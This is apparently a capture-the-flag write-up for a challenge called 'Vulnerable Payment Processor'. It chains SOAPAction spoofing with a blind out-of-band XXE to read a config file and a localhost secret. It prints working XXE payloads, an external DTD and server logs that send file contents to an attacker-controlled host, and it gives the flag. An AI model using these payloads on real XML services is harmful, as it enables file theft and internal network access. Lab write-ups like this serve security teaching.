## Vulnerable Payment Processor

### Description

> We noticed that a banking platform exposes an application at http://xx.xx.xx.xx/paymentProcessor
> Can you take the right action to exploit it?

### Solution

The challenge consists of 2 vulnerabilities that need to be exploited. First, the user needs to exploit a SOAPAction spoofing issue to bypass the access control check and gain access to the vulnerable functionality.

As a next step, the user needs to exploit a blind XXE issue to get access to the secret on the server. To exploit this issue, a technique using out of band requests needs to be used. For this, the attacker needs an internet reachable host under his control. Tools such as Burp Collaborator can also be used for this.

#### SOAPAction Spoofing

The application at http://xx.xx.xx.xx/paymentProcessor returns a link to a WSDL file. The WSDL file contains 2 SOAP calls: “Authenticate” and “processPayment”. A tool such as SOAPUI can be used to generate sample request for both calls.


When making sample requests, we note that the “authenticate” call can be done by an unauthorized user, the “processPayment” request returns an authorization error.

```
POST /paymentProcessor HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: "authenticate"
Content-Length: 305
Host: localhost:1212
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:cyb="http://cybersecchallenge/">
  <soapenv:Header/>
  <soapenv:Body>
     <cyb:authenticate>
        <arg0>user</arg0>
        <arg1>pass</arg1>
     </cyb:authenticate>
  </soapenv:Body>
</soapenv:Envelope>


HTTP/1.1 200 OK
Content-type: text/xml; charset=utf-8
Date: Tue, 05 Feb 2019 09:41:49 GMT
Content-Length: 265
<?xml version="1.0" ?><S:Envelope
xmlns:S="http://schemas.xmlsoap.org/soap/envelope/"><S:Body><ns2:authenticateResponse
xmlns:ns2="http://cybersecchallenge/"><return>Invalid username and password
combination</return></ns2:authenticateResponse></S:Body></S:Envelope>
```

```
POST /paymentProcessor HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: "processPayment"
Content-Length: 281
Host: localhost:1212
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:cyb="http://cybersecchallenge/">
  <soapenv:Header/>
  <soapenv:Body>
     <cyb:processPayment>
        <arg0>test</arg0>
     </cyb:processPayment>
  </soapenv:Body>
</soapenv:Envelope>


HTTP/1.1 200 OK
Content-type: text/xml; charset=utf-8
Date: Tue, 05 Feb 2019 09:41:55 GMT
Content-Length: 247
<?xml version="1.0" ?><S:Envelope
xmlns:S="http://schemas.xmlsoap.org/soap/envelope/"><S:Body><ns2:processPaymentResponse
xmlns:ns2="http://cybersecchallenge/"><return>Authorization
Error</return></ns2:processPaymentResponse></S:Body></S:Envelope>
```


Here, the attacker can use SOAPaction spoofing to bypass the access control and gain access to the “processPayment” functionality.


```
POST /paymentProcessor HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
Content-Length: 278
Host: localhost:1212
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:cyb="http://cybersecchallenge/">
  <soapenv:Header/>
  <soapenv:Body>
     <cyb:processPayment>
        <arg0>?</arg0>
     </cyb:processPayment>
  </soapenv:Body>
</soapenv:Envelope>


HTTP/1.1 200 OK
Content-type: text/xml; charset=utf-8
Date: Tue, 05 Feb 2019 09:43:10 GMT
Content-Length: 367
<?xml version="1.0" ?><S:Envelope
xmlns:S="http://schemas.xmlsoap.org/soap/envelope/"><S:Body><ns2:processPaymentResponse
xmlns:ns2="http://cybersecchallenge/"><return>/home/ec2-user/PaymentProcessor.java:
Error parsing ?
Ensure configuration file config.txt is properly deployed on the application
server.</return></ns2:processPaymentResponse></S:Body></S:Envelope>
```


#### Confirming XXE

As a next step, the attacker needs to find the XXE bug in the only parameter that the “processPayment” call takes. The data needs to be HTML encoded, so that the XML request is not corrupted. The XXE bug is blind, no detailed error information is returned to the user. Using a host under his control, the attacker can trigger an out of band request via XXE to confirm the vulnerability. The following request is an example.

```
POST /paymentProcessor HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: "authenticate"
Content-Length: 444
Host: localhost:1212
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:cyb="http://cybersecchallenge/">
  <soapenv:Header/>
  <soapenv:Body>
     <cyb:processPayment>
        <arg0>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!
DOCTYPE files PUBLIC &quot;-//B/A/EN&quot; &quot;http://kali-
sean.gremwell.com:8080/confirm&quot;></arg0>
     </cyb:processPayment>
  </soapenv:Body>
</soapenv:Envelope>
</arg0>


HTTP/1.1 200 OK
Content-type: text/xml; charset=utf-8
Date: Tue, 05 Feb 2019 09:48:50 GMT
Content-Length: 536
<?xml version="1.0" ?><S:Envelope
xmlns:S="http://schemas.xmlsoap.org/soap/envelope/"><S:Body><ns2:processPaymentResponse
xmlns:ns2="http://cybersecchallenge/"><return>/home/ec2-user/PaymentProcessor.java:
Error parsing &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!
DOCTYPE files PUBLIC &quot;-//B/A/EN&quot; &quot;http://kali-
sean.gremwell.com:8080/confirm&quot;&gt;
Ensure configuration file config.txt is properly deployed on the application
server.</return></ns2:processPaymentResponse></S:Body></S:Envelope>
```

This results in the following request to our server, which confirms the issue.


```
sean@kali-sean:~/cybersecchallenge$ python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
18.216.183.118 - - [05/Feb/2019 10:48:50] code 404, message File not found
18.216.183.118 - - [05/Feb/2019 10:48:50] "GET /confirm HTTP/1.1" 404 -
```

#### Exploiting XXE to retrieve the config file

When making a request to “processPayment”, an error message is returned which references a config file. The current path of the application is also returned.

```
HTTP/1.1 200 OK
Content-type: text/xml; charset=utf-8
Date: Tue, 05 Feb 2019 09:48:50 GMT
Content-Length: 536
<?xml version="1.0" ?><S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/"><S:Body><ns2:processPaymentResponse xmlns:ns2="http://cybersecchallenge/"><return>/home/ec2-user/PaymentProcessor.java: Error parsing &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;! DOCTYPE files PUBLIC &quot;-//B/A/EN&quot; &quot;http://kali- sean.gremwell.com:8080/confirm&quot;&gt;
Ensure configuration file config.txt is properly deployed on the application server. </return></ns2:processPaymentResponse></S:Body></S:Envelope>
```

This allows the attacker to determine the full path of the config file. The attacker can then exploit the XXE issue to read out the contents of the file. Since it is a blind XXE issue, an out of band attack needs to be used. The following is an example.


```
POST /paymentProcessor HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: "authenticate"
Content-Length: 520
Host: localhost:1212
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:cyb="http://cybersecchallenge/">
  <soapenv:Header/>
  <soapenv:Body>
     <cyb:processPayment>
        <arg0>&lt;!DOCTYPE aa[&lt;!ELEMENT bb ANY&gt;
&lt;!ENTITY % file SYSTEM &quot;file:///home/ec2-user/config.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://kali-sean.gremwell.com:8080/sdr.dtd&quot;&gt;
%dtd;]&gt;&lt;bb&gt;&amp;send;&lt;/bb&gt;</arg0>
     </cyb:processPayment>
  </soapenv:Body>
</soapenv:Envelope>


HTTP/1.1 200 OK
Content-type: text/xml; charset=utf-8
Date: Tue, 05 Feb 2019 09:57:17 GMT
Content-Length: 606
<?xml version="1.0" ?><S:Envelope
xmlns:S="http://schemas.xmlsoap.org/soap/envelope/"><S:Body><ns2:processPaymentResponse
xmlns:ns2="http://cybersecchallenge/"><return>/home/ec2-user/PaymentProcessor.java:
Error parsing &lt;!DOCTYPE aa[&lt;!ELEMENT bb ANY&gt;
&lt;!ENTITY % file SYSTEM &quot;file:///home/ec2-user/config.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://kali-sean.gremwell.com:8080/sdr.dtd&quot;&gt;
%dtd;]&gt;&lt;bb&gt;&amp;send;&lt;/bb&gt;
Ensure configuration file config.txt is properly deployed on the application
server.</return></ns2:processPaymentResponse></S:Body></S:Envelope>
```

The decoded parameter from the request above is:

```
<!DOCTYPE aa[<!ELEMENT bb ANY>
<!ENTITY % file SYSTEM "file:///home/ec2-user/config.txt">
<!ENTITY % dtd SYSTEM "http://kali-sean.gremwell.com:8080/sdr.dtd">
%dtd;]><bb>&send;</bb>
```

The sdr.dtd file on our server has the following contents.

```
<?xml version="1.0" encoding="UTF-8"?><!ENTITY % all "<!ENTITY send SYSTEM 'http://kali- sean.gremwell.com:8080/%file;'>">%all;
```

The request results in the following GET request being sent to our server:

```
18.216.183.118 - - [05/Feb/2019 11:01:25]
"GET /backend_secret=http://localhost:8080/secret.txt HTTP/1.1" 404 -
```

The request contains the contents of the config.txt file, which references a backend server running on localhost port 8080 which contains the secret.

#### Exploiting XXE to retrieve the secret

To get the secret file, a similar attack as the last step needs to be done. Instead of reading the config file, a request to the backend server on port 8080 needs to be done.

This can be done via the following request.

```
POST /paymentProcessor HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: "authenticate"
Content-Length: 520
Host: localhost:1212
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:cyb="http://cybersecchallenge/">
  <soapenv:Header/>
  <soapenv:Body>
     <cyb:processPayment>
        <arg0>&lt;!DOCTYPE aa[&lt;!ELEMENT bb ANY&gt;
&lt;!ENTITY % file SYSTEM &quot;http://localhost:8080/secret.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://kali-sean.gremwell.com:8080/sdr.dtd&quot;&gt;
%dtd;]&gt;&lt;bb&gt;&amp;send;&lt;/bb&gt;</arg0>
     </cyb:processPayment>
  </soapenv:Body>
</soapenv:Envelope>


HTTP/1.1 200 OK
Content-type: text/xml; charset=utf-8
Date: Tue, 05 Feb 2019 10:03:37 GMT
Content-Length: 606
<?xml version="1.0" ?><S:Envelope
xmlns:S="http://schemas.xmlsoap.org/soap/envelope/"><S:Body><ns2:processPaymentResponse
xmlns:ns2="http://cybersecchallenge/"><return>/home/ec2-user/PaymentProcessor.java:
Error parsing &lt;!DOCTYPE aa[&lt;!ELEMENT bb ANY&gt;
&lt;!ENTITY % file SYSTEM &quot;http://localhost:8080/secret.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://kali-sean.gremwell.com:8080/sdr.dtd&quot;&gt;
%dtd;]&gt;&lt;bb&gt;&amp;send;&lt;/bb&gt;
Ensure configuration file config.txt is properly deployed on the application
server.</return></ns2:processPaymentResponse></S:Body></S:Envelope>
```

The decoded payload is the following:

```
<!DOCTYPE aa[<!ELEMENT bb ANY>
<!ENTITY % file SYSTEM "http://localhost:8080/secret.txt">
<!ENTITY % dtd SYSTEM "http://kali-sean.gremwell.com:8080/sdr.dtd">
%dtd;]><bb>&send;</bb>
```

The sdr.dtd file is unchanged.
When making this request, the following incoming request to our server is observed. This contains the value of the secret.txt file.

```
18.216.183.118 - - [05/Feb/2019 11:03:37] "GET /CSC{C0n5r4tz_y0u_m4ster3d_O0B_Xx3} HTTP/1.1" 404 -
```

### Flag
`CSC{C0n5r4tz_y0u_m4ster3d_O0B_Xx3}`


### Creator
Sean De Regge

